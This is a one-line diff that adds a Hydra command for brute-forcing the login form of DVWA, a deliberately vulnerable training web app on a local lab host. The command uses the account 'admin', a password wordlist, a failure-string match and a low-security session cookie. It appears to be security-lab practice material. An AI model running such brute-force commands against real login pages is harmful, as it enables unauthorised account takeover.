@@ -1,0 +1,1 @@
+hydra -l admin -f dvwa.local -P password_brute/passwords.txt -V http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:incorrect.:H-Cookie:security=low; security=low; PHPSESSID=p49fqombtrtcs1d0akka0mcba3"
